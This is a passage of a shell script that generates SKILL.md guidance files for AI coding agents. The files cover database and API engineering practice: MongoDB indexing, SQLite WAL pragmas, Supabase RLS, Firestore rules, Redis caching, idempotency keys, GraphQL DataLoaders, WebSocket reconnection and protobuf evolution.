5. Create Compound Indexes following the Equality, Sort, Range (ESR) rule: equality filters first, sort keys second, range filters last.
6. Build efficient Aggregation Pipelines:
   - Place `$match` and `$project` stages as early as possible in the pipeline to filter and prune fields before memory-intensive `$group` or `$sort` stages.
   - Ensure the initial `$match` and `$sort` stages utilize existing indexes.
   - Use `$facet` for multi-faceted search and pagination in a single round-trip.
7. Use MongoDB schema validation rules (`$jsonSchema`) to enforce data consistency and required attributes at the collection level.

## Constraints / Rules
- Never design schemas that allow documents to exceed the 16MB BSON limit.
- Avoid using `$lookup` (joins) in high-frequency OLTP read paths; denormalize critical read data into the primary document instead.
- Do not place `$group` before `$match` in aggregation pipelines.

## Workflow
1. List the top 5 most frequent read and write queries.
2. Choose embedding or referencing based on cardinality and query co-occurrence.
3. Formulate compound indexes following the ESR rule.
4. Construct aggregation pipeline with early filter stages.
5. Verify with `explain("executionStats")` to ensure `nReturned == totalDocsExamined`.

## Expected Output
MongoDB schema definitions, JSON schema validation rules, compound index specifications, and optimized aggregation pipelines.

## Validation Checklist
- [ ] Are embedded arrays strictly bounded in size?
- [ ] Do compound indexes follow the Equality, Sort, Range (ESR) rule?
- [ ] Are `$match` stages placed at the very beginning of aggregation pipelines?
- [ ] Are large collections protected with `$jsonSchema` validation?
- [ ] Does `explain()` verify that the pipeline utilizes an index without in-memory sorting spills?

## Common Mistakes & Antipatterns
- Modeling a social network by embedding all user followers into a single document's `followers: []` array, causing documents to blow past the 16MB limit.
- Writing aggregation pipelines that `$lookup` three different collections on every user page load, treating MongoDB like a slow relational database.
- Building compound indexes in arbitrary order, failing to support combined filter and sort operations.

## Concrete Real-World Example
Scenario: An activity feed aggregation in MongoDB takes 4 seconds to execute because it filters and sorts over an unindexed collection of 2 million activities.
Prompt: Optimize this MongoDB activity feed aggregation pipeline and add required indexes.
Application: The AI creates a compound index on `{ userId: 1, createdAt: -1 }`, moves `$match: { userId: ... }` to stage 1, immediately follows with `$sort: { createdAt: -1 }`, limits to 20 records before applying `$lookup` for author profiles, reducing latency to 12ms.
EOF

cat << 'EOF' > skills/database/sqlite/embedded-wal-mode-optimization/SKILL.md
---
name: "embedded-wal-mode-optimization"
description: "Configuring high-concurrency embedded SQLite databases utilizing Write-Ahead Logging (WAL), memory-mapped I/O, optimal pragmas, and transaction batching."
category: "database"
subcategory: "sqlite"
language: "sql"
framework: "none"
technology: "sqlite"
difficulty: "intermediate"
tags: ["database", "sqlite", "embedded", "wal-mode", "pragmas", "performance", "concurrency"]
---

# SQLite Embedded Optimization, WAL Mode, and Pragmas

## Purpose
Provide concrete configuration standards and transaction patterns to unlock high concurrent read/write throughput in embedded SQLite instances.

## When to Use
Use when running SQLite in production (desktop apps, mobile apps, local developer tooling, edge services, single-node web services).

## Inputs / Context
SQLite database connection handler, concurrency requirements, durability needs, and memory budget.

## Instructions
1. Enable Write-Ahead Logging (WAL) mode immediately on opening the database: `PRAGMA journal_mode = WAL;`. This allows concurrent readers to operate without blocking writers, and writers to operate without blocking readers.
2. Configure optimal performance Pragmas on connection initialization:
   - `PRAGMA synchronous = NORMAL;`: Provides significant write speedups while preserving database integrity across application crashes.
   - `PRAGMA busy_timeout = 5000;`: Configures SQLite to wait up to 5,000ms when encountering a database lock before throwing `SQLITE_BUSY`.
   - `PRAGMA cache_size = -64000;`: Allocates 64MB of page cache in RAM (negative number specifies kibibytes).
   - `PRAGMA foreign_keys = ON;`: Enforces foreign key constraint verification (disabled by default in SQLite).
   - `PRAGMA temp_store = MEMORY;`: Stores temporary tables and indices in RAM instead of disk.
   - `PRAGMA mmap_size = 30000000000;`: Enables memory-mapped I/O for direct kernel memory access.
3. Batch write operations into explicit transactions: wrapping 1,000 individual `INSERT` statements in a single `BEGIN TRANSACTION ... COMMIT` improves write performance by 100x-1000x.
4. Use prepared statements for all recurring queries to eliminate query parsing overhead and guarantee SQL injection immunity.
5. In multi-threaded environments, configure a single shared connection for writes and a pool of read-only connections, or use a serialized connection pool.

## Constraints / Rules
- Never write single-row inserts in a loop without wrapping them in an explicit transaction.
- Do not use SQLite over network-attached storage (NFS/SMB) in WAL mode, as POSIX file locking is unreliable over network filesystems.
- Avoid running long-running read transactions in WAL mode, as this prevents WAL log truncation and causes the `-wal` file to grow uncontrollably.

## Workflow
1. Open database connection.
2. Execute initialization PRAGMA statements (`journal_mode`, `synchronous`, `busy_timeout`, `foreign_keys`).
3. Wrap batch operations in `BEGIN IMMEDIATE TRANSACTION`.
4. Monitor database and `-wal` file sizes.
5. Run periodic `PRAGMA optimize;` before closing connections.

## Expected Output
SQLite connection initialization script and transaction wrappers maximizing concurrent read/write throughput.

## Validation Checklist
- [ ] Is `PRAGMA journal_mode = WAL;` enabled?
- [ ] Is `PRAGMA busy_timeout` set to at least 5000ms?
- [ ] Is `PRAGMA foreign_keys = ON;` explicitly configured?
- [ ] Are bulk inserts batched inside explicit transactions?
- [ ] Are prepared statements utilized for all parameter bindings?

## Common Mistakes & Antipatterns
- Leaving SQLite in default rollback journal mode (`journal_mode = DELETE`), causing writes to lock the entire database and block all reads.
- Executing 5,000 individual inserts in a loop without a transaction, forcing 5,000 separate disk sync operations that take minutes instead of milliseconds.
- Forgetting `PRAGMA foreign_keys = ON;`, allowing child records to be inserted with non-existent parent IDs.

## Concrete Real-World Example
Scenario: A desktop app using SQLite freezes for 10 seconds whenever it imports a 5,000-row CSV file, and crashes with `SQLITE_BUSY` when the user clicks anything during import.
Prompt: Optimize this SQLite database connection and import routine for high throughput and non-blocking reads.
Application: The AI configures `journal_mode = WAL`, sets `busy_timeout = 5000`, wraps the CSV parsing loop in a single `BEGIN TRANSACTION`, and uses prepared statements, cutting the import time from 10 seconds to 80ms while keeping the UI responsive.
EOF

cat << 'EOF' > skills/database/supabase/row-level-security-policies/SKILL.md
---
name: "row-level-security-policies"
description: "Architecting multi-tenant, secure Supabase PostgreSQL databases using fine-grained Row-Level Security (RLS) policies, auth.uid() checks, and performant subquery joins."
category: "database"
subcategory: "supabase"
language: "sql"
framework: "none"
technology: "supabase"
difficulty: "intermediate"
tags: ["database", "supabase", "rls", "postgres", "security", "multi-tenant", "auth"]
---

# Supabase Row-Level Security (RLS) and Tenant Isolation

## Purpose
Instruct AI agents to write ironclad PostgreSQL Row-Level Security (RLS) policies in Supabase, preventing data leakage across tenants while maintaining sub-millisecond query performance.

## When to Use
Use when creating or updating tables in Supabase, implementing multi-tenant data models, or securing client-side database queries.

## Inputs / Context
Table schemas, tenancy model (single-user vs. organization/team), user roles, and CRUD permission matrices.

## Instructions
1. Always enable Row-Level Security immediately upon creating any table: `ALTER TABLE public.my_table ENABLE ROW LEVEL SECURITY;`.
2. Explicitly revoke public access: `REVOKE ALL ON public.my_table FROM anon, authenticated;` and grant specific permissions (`SELECT`, `INSERT`, `UPDATE`, `DELETE`) as needed.
3. For individual user-owned tables, create simple policies matching `auth.uid()`:
   `CREATE POLICY "Users can access own records" ON my_table FOR ALL TO authenticated USING (user_id = auth.uid()) WITH CHECK (user_id = auth.uid());`
4. For organization/team-owned tables, avoid correlated subqueries inside RLS policies that re-evaluate for every single row. Instead, wrap authorization lookups in security-definer helper functions or use indexed `EXISTS` subqueries:
   `CREATE POLICY "Team members view team documents" ON documents FOR SELECT TO authenticated USING (EXISTS (SELECT 1 FROM team_members WHERE team_members.team_id = documents.team_id AND team_members.user_id = auth.uid()));`
5. Always index the foreign key columns referenced in RLS policies (e.g., index `team_id` and `user_id`); unindexed RLS columns trigger sequential scans on every query.
6. Provide distinct `USING` (read/filter) and `WITH CHECK` (write/validate) expressions on `UPDATE` policies to prevent users from updating a record to belong to another user.
7. Bypass RLS only in trusted backend microservices using the `service_role` key; never expose the `service_role` key to client applications.

## Constraints / Rules
- Never create a table in the `public` schema in Supabase without enabling RLS.
- Never use `USING (true)` on mutation policies (`INSERT`, `UPDATE`, `DELETE`) for authenticated users.
- Avoid calling complex multi-table joins inside RLS policies without covering indexes.

## Workflow
1. Define table schema with foreign keys to `auth.users` or team tables.
2. Enable RLS on the table.
3. Create indexes on all columns evaluated in RLS conditions.
4. Author granular policies for `SELECT`, `INSERT`, `UPDATE`, `DELETE`.
5. Test using Supabase client impersonation or `SET ROLE authenticated; SET request.jwt.claim.sub = 'user-uuid';`.

## Expected Output
Complete SQL migration enabling RLS, defining targeted CRUD policies with `auth.uid()`, and creating prerequisite performance indexes.

## Validation Checklist
- [ ] Is `ENABLE ROW LEVEL SECURITY` executed on every public table?
- [ ] Are columns used in RLS policies (e.g., `user_id`, `team_id`) indexed?
- [ ] Do `UPDATE` policies specify both `USING` and `WITH CHECK` clauses?
- [ ] Are separate policies created for different operations (`SELECT` vs `DELETE`)?
- [ ] Is data isolation verified under simulated authenticated user roles?

## Common Mistakes & Antipatterns
- Enabling RLS on a table but forgetting to write any policies, causing all queries by authenticated users to return empty result sets.
- Using an unindexed subquery in an RLS policy on a 100,000-row table, degrading query response times from 5ms to 8 seconds.
- Writing an `UPDATE` policy with only `USING (user_id = auth.uid())` without `WITH CHECK`, allowing users to change `user_id` to another user's ID.

## Concrete Real-World Example
Scenario: A SaaS application allows any logged-in user to read all other companies' invoices because the invoices table was created in Supabase without RLS.
Prompt: Secure this Supabase invoices table with multi-tenant RLS policies based on team membership.
Application: The AI enables RLS on `invoices`, indexes `invoices(team_id)`, and defines an `EXISTS` policy verifying that `auth.uid()` belongs to the associated `team_id` in the `team_members` table, completely isolating tenant data.
EOF

cat << 'EOF' > skills/database/firebase/firestore-security-and-queries/SKILL.md
---
name: "firestore-security-and-queries"
description: "Authoring declarative Cloud Firestore Security Rules, preventing unauthorized document reads/writes, enforcing schema validation, and structuring compound queries."
category: "database"
subcategory: "firebase"
language: "javascript"
framework: "none"
technology: "firestore"
difficulty: "intermediate"
tags: ["database", "firebase", "firestore", "security-rules", "nosql", "permissions"]
---

# Cloud Firestore Security Rules and Indexed Queries

## Purpose
Provide AI agents with concrete rules for authoring airtight Firestore Security Rules and structuring queries that strictly conform to Firestore indexing constraints.

## When to Use
Use when securing Firebase Firestore databases, implementing client-side queries, validating document structures, or resolving missing index errors.

## Inputs / Context
Firestore collection hierarchy, user authentication state, role definitions, and document schema rules.

## Instructions
1. Structure Firestore Security Rules using version 2 syntax (`rules_version = '2'; service cloud.firestore { ... }`).
2. Default-deny all access at the root: `match /{document=**} { allow read, write: if false; }`.
3. Separate `read` permissions into granular `get` (single document) and `list` (queries/collections) rules.
4. Separate `write` permissions into granular `create`, `update`, and `delete` rules.
5. In `create` rules, validate incoming document schemas using `request.resource.data`:
   - Verify required fields exist and have correct types (`request.resource.data.title is string`).
   - Prevent client tampering with server-assigned fields (e.g., enforce `request.resource.data.authorId == request.auth.uid`).
6. In `update` rules, enforce immutability on sensitive fields using `request.resource.data.diff(resource.data).affectedKeys().hasOnly(['field1', 'field2'])`.
7. Remember that Firestore Security Rules are not filters: queries must specify the exact constraints enforced by security rules, otherwise the entire query is rejected.
8. Define compound indexes in `firestore.indexes.json` for queries combining equality filters with inequality/range filters or sorting on multiple fields.

## Constraints / Rules
- Never write `allow read, write: if request.auth != null;` across entire collections in production.
- Avoid deep subcollection nesting beyond 2-3 levels; use root collections with foreign key references for complex relationships.
- Do not make more than 10 `get()` or `exists()` calls within a single security rule evaluation (Firestore limit).

## Workflow
1. Map collection structure and permission requirements.
2. Draft modular helper functions in `firestore.rules` (e.g., `isSignedIn()`, `isOwner(userId)`).
3. Author granular CRUD rules with schema validation.
4. Define compound indexes in `firestore.indexes.json` matching application queries.
5. Test using the Firebase Rules Unit Testing SDK (`@firebase/rules-unit-testing`).

## Expected Output
Complete `firestore.rules` file with helper functions, schema validation, and matching `firestore.indexes.json` compound index definitions.

## Validation Checklist
- [ ] Is root default-deny rule configured?
- [ ] Are `create`, `update`, and `delete` rules split into distinct blocks?
- [ ] Is `request.resource.data` validated for required fields and types?
- [ ] Are sensitive fields (IDs, creation timestamps) protected from updates?
- [ ] Are required compound indexes defined in `firestore.indexes.json`?

## Common Mistakes & Antipatterns
- Writing `allow read, write: if true;` for temporary testing and deploying it to production, leaving the entire database publicly readable and writable.
- Assuming Firestore rules filter results: writing a rule that restricts access to `resource.data.ownerId == request.auth.uid`, but running a query without `.where('ownerId', '==', uid)`, which Firestore rejects with 'Missing or insufficient permissions'.
- Mutating document author or creation date on document updates.

## Concrete Real-World Example
Scenario: A mobile app's Firestore comments collection allows any authenticated user to edit or delete comments created by other users.
Prompt: Write Firestore security rules that allow public read, restrict creation to authenticated users setting their own authorId, and restrict edit/delete to the original author.
Application: The AI crafts rules using helper functions `isOwner()`, restricts `create` by verifying `request.resource.data.authorId == request.auth.uid`, restricts `update` to `isOwner()` and forbids modifying `authorId` or `createdAt`, and restricts `delete` to `isOwner()`.
EOF

cat << 'EOF' > skills/database/redis/caching-invalidation-strategies/SKILL.md
---
name: "caching-invalidation-strategies"
description: "Architecting resilient Redis caching layers utilizing Cache-Aside, Write-Through, TTL jitter, dogpile/stampede prevention via distributed locks, and probabilistic early expiration."
category: "database"
subcategory: "redis"
language: "agnostic"
framework: "none"
technology: "redis"
difficulty: "advanced"
tags: ["database", "redis", "caching", "invalidation", "cache-stampede", "ttl-jitter", "distributed-locks"]
---

# Redis Caching Strategies and Invalidation Architecture

## Purpose
Provide concrete engineering patterns for implementing high-performance Redis caching layers that eliminate cache stampedes, stale data bugs, and memory exhaustion.

## When to Use
Use when adding a caching layer over relational databases or external APIs, caching expensive computation results, or preventing database overload.

## Inputs / Context
Data volatility, cache hit ratio goals, memory capacity, read/write patterns, and acceptable staleness tolerance.

## Instructions
1. Standardize on the Cache-Aside (Lazy Loading) pattern for general read workflows:
   - Check Redis for key. If HIT, return cached value immediately.
   - If MISS, acquire distributed lock or compute from primary database, write result to Redis with TTL, and return.
2. Always attach a Time-To-Live (TTL) to every cached key; unexpiring keys in Redis lead to uncontrolled memory growth and eventual OOM evictions.
3. Prevent Cache Stampedes (Dogpile Effect) when hot keys expire under high concurrency:
   - Use Probabilistic Early Expiration (XFetch algorithm) to recompute cache in the background before hard expiration.
   - Or use Redis-based distributed mutex locks (e.g., `SET key lock NX PX 5000`) so only a single worker recomputes the cache while others wait.
4. Prevent synchronized mass-expirations by adding randomized Jitter to TTLs (`actualTTL = baseTTL + random(-jitter, +jitter)`).
5. Invalidate caches explicitly on data mutations: emit cache invalidation events or delete keys directly upon write (`redis.del(key)`).
6. Namespace Redis keys cleanly using colons: `service:entity:identifier:attribute` (e.g., `ecommerce:product:84920:details`).
7. Store structured data using Redis Hashes (`HSET`, `HGETALL`) for multi-field entities or compact binary serialization (MessagePack, protobuf) instead of verbose JSON strings.

## Constraints / Rules
- Never write keys without a TTL unless explicitly intended for persistent storage.
- Never use the `KEYS *` command in production Redis; it blocks the single-threaded server. Use `SCAN` with cursor iteration instead.
- Avoid caching empty or null results indefinitely; use a very short TTL (e.g., 30 seconds) for negative caching to prevent cache penetration attacks.

## Workflow
1. Define key namespacing convention and serialization strategy.
2. Implement Cache-Aside wrapper with base TTL and randomized jitter.
3. Add distributed locking around cache-miss recalculation.
4. Hook cache deletion/invalidation into database write pipelines.
5. Monitor cache hit/miss metrics and memory fragmentation ratio (`INFO memory`).

## Expected Output
Resilient Redis caching service wrapper with TTL jitter, stampede protection, atomic mutations, and negative cache handling.

## Validation Checklist
- [ ] Does every written key include an explicit TTL?
- [ ] Is randomized jitter added to TTL values to avoid synchronized expiry?
- [ ] Is `KEYS *` prohibited in favor of non-blocking `SCAN`?
- [ ] Are cache stampedes prevented on hot key misses using distributed locks or XFetch?
- [ ] Are caches invalidated or updated upon primary data mutation?

## Common Mistakes & Antipatterns
- Caching an expensive database query without a mutex lock, causing 1,000 concurrent requests to hit the database simultaneously when the key expires (Cache Stampede).
- Setting identical 1-hour TTLs on 500,000 product keys during an import, causing all 500,000 keys to expire at the exact same second 1 hour later.
- Running `KEYS user:*` on a production Redis instance with 10 million keys, freezing the Redis server for several seconds.

## Concrete Real-World Example
Scenario: A viral news website crashes its Postgres database every 10 minutes because the homepage article cache expires, and 5,000 concurrent requests simultaneously execute the same heavy SQL join.
Prompt: Refactor this article cache retrieval function to prevent cache stampedes in Redis.
Application: The AI wraps the fetch in an atomic `SET lock:article:123 NX PX 3000` pattern, allowing only the first request to query Postgres while other incoming requests wait or receive stale data with a soft TTL, and adds a +/- 15% randomized jitter to the hard TTL.
EOF

cat << 'EOF' > skills/api/rest/idempotent-endpoint-design/SKILL.md
---
name: "idempotent-endpoint-design"
description: "Designing robust, idempotent REST API mutations (POST, PUT, PATCH, DELETE) using IETF Idempotency-Key headers, atomic distributed locks, and response caching."
category: "api"
subcategory: "rest"
language: "agnostic"
framework: "none"
technology: "rest-api"
difficulty: "intermediate"
tags: ["api", "rest", "idempotency", "http", "distributed-systems", "payments"]
---

# Idempotent REST API Design and Idempotency Keys

## Purpose
Instruct AI agents to implement reliable HTTP endpoints where duplicate network requests (caused by client retries, timeouts, or disconnects) do not produce duplicate side-effects.

## When to Use
Use when designing billing/payment APIs, order creation endpoints, email dispatch triggers, or any mutation where duplicate execution causes financial or data corruption.

## Inputs / Context
API endpoint specifications, payload schemas, side-effects, idempotency header standard (`Idempotency-Key`), and storage backend.

## Instructions
1. Adhere to standard HTTP method idempotency semantics:
   - GET, HEAD, OPTIONS, PUT, DELETE must be inherently idempotent.
   - POST is non-idempotent by default; require an `Idempotency-Key` HTTP header for non-idempotent state mutations.
2. Implement Idempotency-Key processing pipeline:
   - Validate client provides a valid UUIDv4 or string token in `Idempotency-Key`.
   - Compute a SHA-256 fingerprint hash of the request method, path, and request body.
   - Check cache/database for existing key:
     * If key exists with identical payload hash and status `COMPLETED`: immediately return the cached status code and response body without re-executing logic.
     * If key exists with a DIFFERENT payload hash: reject immediately with HTTP `422 Unprocessable Entity` or `400 Bad Request` ('Idempotency key reused with mismatched payload').
     * If key exists with status `PROCESSING`: reject with HTTP `409 Conflict` or `425 Too Early` to prevent concurrent execution of the same key.
   - If key does not exist: atomically store key with status `PROCESSING` and a short lock TTL (e.g., 60 seconds).
3. Execute the domain mutation within an isolated transaction.
4. Upon successful completion, update the idempotency record to `COMPLETED`, store the HTTP status code, headers, and response body, and set a retention TTL (e.g., 24-72 hours).
5. On unhandled server errors, delete the idempotency lock so the client can retry safely.
6. Return standard headers: `Idempotency-Key`, `Original-Request-Date`.

## Constraints / Rules
- Never execute non-idempotent side effects before acquiring the idempotency lock.
- Never return cached responses if the payload hash differs from the initial request.
- Do not store unbounded idempotency records; always enforce a retention TTL.

## Workflow
1. Extract and validate `Idempotency-Key` header from inbound request.
2. Hash incoming request body.
3. Query Redis/Postgres for existing idempotency record using atomic lock primitives.
4. Process business logic or return cached response.
5. Save final HTTP response to the idempotency store upon completion.

## Expected Output
Idempotent API endpoint middleware and controller code supporting header validation, payload fingerprinting, atomic state transitions, and cached response replay.

## Validation Checklist
- [ ] Are duplicate requests with identical keys replaying the initial response without re-executing logic?
- [ ] Are duplicate keys with different payloads rejected with HTTP 422?
- [ ] Is concurrent execution with the same key blocked with HTTP 409?
- [ ] Is an expiration TTL set on stored idempotency keys?
- [ ] Are locks released if an unhandled internal exception occurs?

## Common Mistakes & Antipatterns
- Saving the idempotency response before the database transaction commits, returning success even if the database rollback failed.
- Allowing clients to reuse the same idempotency key with different payment amounts without detecting the payload mismatch.
- Failing to handle in-flight duplicate requests arriving milliseconds apart, leading to double-charging before the first request finishes.

## Concrete Real-World Example
Scenario: An e-commerce customer with a spotty mobile connection taps 'Pay $100' three times because the first two requests timed out.
Prompt: Build an idempotency middleware for this Express payment route using Redis.
Application: The AI creates middleware checking `Idempotency-Key`, sets an atomic `SET NX` lock with a hash of `{ amount: 100, cartId: 'xyz' }`, processes the payment only once, caches the 200 response, and returns the cached response for the two subsequent retried requests.
EOF

cat << 'EOF' > skills/api/graphql/schema-design-and-dataloaders/SKILL.md
---
name: "schema-design-and-dataloaders"
description: "Designing production GraphQL schemas using Relay cursor pagination, strong input/output types, and solving the N+1 query problem via batching DataLoaders."
category: "api"
subcategory: "graphql"
language: "typescript"
framework: "none"
technology: "graphql"
difficulty: "advanced"
tags: ["api", "graphql", "dataloader", "n-plus-one", "schema-design", "relay-pagination"]
---

# GraphQL Schema Design and DataLoader N+1 Prevention

## Purpose
Provide AI agents with architecture standards for GraphQL schemas, enforcing strict input types, scalable pagination, and batching mechanisms to eliminate database query amplification.

## When to Use
Use when designing GraphQL APIs, writing resolvers for relational data, building unified federated graphs, or resolving GraphQL performance bottlenecks.

## Inputs / Context
Domain entities, relationship cardinality, query requirements, and underlying database models.

## Instructions
1. Design schemas following the GraphQL Best Practices:
   - Use explicit, dedicated `Input` types for every mutation (e.g., `input CreateUserInput { ... }`).
   - Return payload objects from mutations containing both the modified entity and possible domain errors (e.g., `type CreateUserPayload { user: User, userErrors: [UserError!]! }`).
2. Implement Relay-compliant Cursor Connections for pagination: `edges`, `node`, `pageInfo { hasNextPage, endCursor }` instead of naive offset/limit pagination.
3. Solve the N+1 Query Problem in field resolvers by always using DataLoaders for database lookups:
   - Instantiate fresh DataLoader instances per request (scoped to the GraphQL execution context) to prevent cross-request data leaks.
   - Batch individual IDs into a single database `WHERE id IN (...)` query.
   - Ensure the batch loader function returns an array of identical length and order matching the input keys array (filling missing entries with `null` or `Error`).
4. Prevent Denial of Service (DoS) by enforcing Query Depth Limiting (e.g., max 6 levels deep) and Query Complexity Analysis.
5. Mask internal server exceptions: log detailed stack traces on the server while returning sanitized `GraphQLError` messages with custom `extensions.code` to clients.

## Constraints / Rules
- Never query the database directly inside nested field resolvers without a DataLoader.
- Never share DataLoader cache instances across different HTTP requests.
- Avoid exposing unbounded list fields without required `first` or `last` limit arguments.

## Workflow
1. Define GraphQL schema with explicit inputs, payloads, and connection types.
2. Initialize per-request DataLoaders inside the GraphQL context creation function.
3. Wire resolvers to dispatch requests through DataLoaders.
4. Add query depth limiting and query complexity plugins.
5. Validate resolver execution counts using database query logging.

## Expected Output
Clean GraphQL schema definition (SDL), context-scoped DataLoader factories, and batch-optimized field resolvers.

## Validation Checklist
- [ ] Are DataLoaders instantiated per request in the context?
- [ ] Does the batch loader function preserve key order and array length?
- [ ] Is Relay cursor pagination implemented on collection fields?
- [ ] Are query depth and complexity limits enforced?
- [ ] Does requesting 50 parent items with 10 child relations execute exactly 2 database queries instead of 51?

## Common Mistakes & Antipatterns
- Declaring a global static DataLoader, accidentally leaking cached private user data to other concurrent users.
- Returning an array from a DataLoader batch function that does not match the exact order of the input keys array, corrupting resolver data mapping.
- Leaving schemas open to recursive queries (e.g., `author -> books -> author -> books`), crashing the server with stack overflow.

## Concrete Real-World Example
Scenario: A GraphQL query fetching 30 blog posts and their authors triggers 31 separate SQL queries (1 for posts, 30 for authors), taking 600ms.
Prompt: Fix the N+1 query problem on this GraphQL post author resolver using DataLoader.
Application: The AI creates an `AuthorLoader` in the request context, batches author IDs into `SELECT * FROM authors WHERE id IN (?)`, orders the results to match requested IDs, reducing database round-trips from 31 to 2 and response latency to 18ms.
EOF

cat << 'EOF' > skills/api/websocket/heartbeat-and-reconnection/SKILL.md
---
name: "websocket-and-reconnection"
description: "Building resilient, bidirectional WebSocket communication channels with application-level ping/pong heartbeats, exponential backoff reconnection, and message acknowledgments."
category: "api"
subcategory: "websocket"
language: "typescript"
framework: "none"
technology: "websocket"
difficulty: "intermediate"
tags: ["api", "websocket", "real-time", "heartbeat", "reconnection", "networking"]
---

# WebSocket Architecture with Heartbeats and Reconnection

## Purpose
Instruct AI agents to implement production-grade WebSocket client and server architectures that detect silent connection drops, reconnect automatically, and prevent message loss.

## When to Use
Use when building real-time chat, collaborative document editing, live notification feeds, financial tickers, or multiplayer game state synchronization.

## Inputs / Context
Message protocol format, heartbeat interval (e.g., 30s), reconnection policy, and authentication mechanism.

## Instructions
1. Implement an application-level Heartbeat (Ping/Pong) mechanism:
   - Server sends periodic `ping` frames or messages every N seconds (e.g., 30s).
   - Client responds with `pong`.
   - If no pong or activity is received within a timeout window (e.g., 10s after ping), terminate the dead socket (`socket.terminate()`) to clean up server resources.
2. Authenticate WebSocket connections during the initial HTTP upgrade handshake: validate session cookie or short-lived signed ticket; never pass static API secrets in WebSocket URLs.
3. Build resilient client-side reconnection logic:
   - Never reconnect immediately on close; use Jittered Exponential Backoff (e.g., 1s, 2s, 4s, 8s up to 30s max delay).
   - Reset backoff delay only after a connection has remained established and stable for at least 10 seconds.
4. Implement Message Acknowledgments (ACKs) with unique sequence IDs (`msgId`) to guarantee delivery of critical events.
5. Buffer outbound messages during transient disconnections up to a bounded queue limit (e.g., 100 messages), dropping oldest non-essential telemetry if overflow occurs.
6. Support multi-node horizontal scaling using Redis Pub/Sub or a message broker to broadcast messages across server instances.

## Constraints / Rules
- Never trust the TCP connection to close cleanly; mobile clients frequently drop connections silently without sending FIN/RST packets.
- Avoid reconnecting with a static delay, which creates a stampede on the server during restarts.
- Do not buffer unbounded numbers of messages in memory while disconnected.

## Workflow
1. Set up WebSocket server with upgrade authentication hook.
2. Implement server-side ping interval and dead-socket reaper loop.
3. Build client WebSocket wrapper with state machine (CONNECTING, OPEN, CLOSING, CLOSED, RECONNECTING).
4. Add jittered backoff reconnection and message queueing.
5. Test behavior under simulated airplane mode and network latency.

## Expected Output
Robust WebSocket client and server implementation featuring heartbeat timers, authenticated handshakes, jittered reconnection, and ACK message queues.

## Validation Checklist
- [ ] Are silent connection drops detected and reaped within timeout bounds?
- [ ] Does client reconnection use exponential backoff with randomized jitter?
- [ ] Is authentication validated during the initial HTTP upgrade request?
- [ ] Are outbound message queues bounded to prevent memory exhaustion?
- [ ] Does the server scale horizontally across multiple instances using pub/sub?

## Common Mistakes & Antipatterns
- Relying on TCP keepalive alone, which can take over 2 hours on mobile operating systems to detect an abruptly severed connection.
- Reconnecting in a tight infinite loop (`onclose = () => connect()`), instantly crashing the server with thousands of reconnect requests during a brief network hiccup.
- Passing sensitive auth tokens in WebSocket query strings (`ws://example.com?token=xyz`), exposing them in access logs and browser histories.

## Concrete Real-World Example
Scenario: A financial trading terminal loses real-time quote updates silently when users switch Wi-Fi networks, showing stale prices without warning.
Prompt: Implement a resilient WebSocket client wrapper with heartbeat monitoring and automatic reconnection.
Application: The AI authors a `ResilientWebSocket` class that sends periodic pings, detects missing pongs within 5 seconds, triggers an immediate teardown, transitions UI to 'Reconnecting...', and executes exponential backoff reconnection with message queue flushing.
EOF

cat << 'EOF' > skills/api/grpc/protobuf-schema-evolution/SKILL.md
---
name: "protobuf-schema-evolution"
description: "Designing high-performance inter-service RPC APIs using Protocol Buffers v3, backward/forward compatible schema evolution rules, and gRPC interceptors."
category: "api"
subcategory: "grpc"
language: "protobuf"
framework: "grpc"
technology: "grpc-protobuf"
difficulty: "advanced"
tags: ["api", "grpc", "protobuf", "microservices", "schema-evolution", "rpc"]
---

# gRPC Service Architecture and Protocol Buffers Schema Evolution

## Purpose
Guide AI in designing high-throughput, backward-compatible gRPC service contracts, maintaining strict protobuf field numbering rules and interceptor pipelines.

## When to Use
Use when architecting internal microservice communication, polyglot service meshes, high-performance streaming pipelines, or latency-critical RPCs.

## Inputs / Context
Service domain model, RPC methods, message structures, versioning policy, and cross-cutting interceptor requirements.

## Instructions
1. Define services and messages using `syntax = "proto3";`.
2. Follow strict Protocol Buffers Backward and Forward Compatibility Rules:
   - NEVER change the numeric tag of an existing field.
   - NEVER reuse a deleted field number; mark obsolete field tags and names using `reserved` (e.g., `reserved 4, 7 to 9; reserved "foo", "bar";`).
   - New fields must always be optional (default in proto3); old servers must be able to parse messages from new clients by ignoring unknown fields.
   - NEVER change the data type of an existing field.
3. Group related messages into versioned packages (e.g., `package orders.v1;`).
4. Implement standard gRPC Interceptors for cross-cutting concerns:
   - Unary and Streaming Server Interceptors for correlation ID propagation, request logging, and authentication verification.
   - Client Interceptors for deadline/timeout enforcement and distributed tracing.
5. Always set explicit Deadlines (timeouts) on the client for every RPC call; propagate deadlines across downstream service hops via context.
6. Map business and domain errors to standard gRPC Status Codes (`NOT_FOUND`, `INVALID_ARGUMENT`, `ALREADY_EXISTS`, `UNAUTHENTICATED`, `PERMISSION_DENIED`, `DEADLINE_EXCEEDED`).
7. Enrich error responses using `google.rpc.Status` with structured error details (`BadRequest`, `PreconditionFailure`, `ErrorInfo`).

## Constraints / Rules
- Never remove or renumber existing protobuf field numbers without `reserved` declarations.
- Never make gRPC calls without configuring an explicit deadline/timeout.
- Do not use streaming RPCs when a standard unary call suffices.

## Workflow
1. Author `.proto` file with service definitions and message schemas.
2. Declare `reserved` tags for deprecated attributes.
3. Generate server and client stubs using `protoc` or `buf`.
4. Implement server handlers with deadline checking and gRPC status code mapping.
5. Configure client interceptors to inject deadlines and tracing headers.

## Expected Output
Clean `.proto` schema file adhering to proto3 evolution standards, along with server interceptor and error handling implementations.

## Validation Checklist
- [ ] Are proto files organized in versioned packages (`package domain.v1;`)?
- [ ] Are deleted field tags explicitly marked as `reserved`?
- [ ] Are client calls configured with explicit deadlines?
- [ ] Are domain errors mapped to standard `grpc/status` codes?
- [ ] Are generated stubs verified against breaking changes using `buf breaking`?

## Common Mistakes & Antipatterns
- Renumbering fields in a `.proto` file to make them consecutive, corrupting binary deserialization across existing running services.
- Omitting deadlines on client RPC calls, allowing a stalled downstream microservice to exhaust the calling service's thread pool.
- Returning generic `INTERNAL` status codes for all errors, hiding validation and authentication failures from callers.

## Concrete Real-World Example
Scenario: An internal payment microservice breaks existing checkout clients after an engineer changes the field tag of `amount_cents` from 2 to 3.
Prompt: Fix this protobuf schema breaking change and establish schema evolution guidelines for this service.
Application: The AI restores `amount_cents` to tag 2, marks tag 3 as `reserved`, adds a `buf.yaml` lint and breaking-change detection configuration, and documents field immutability rules for future migrations.
EOF

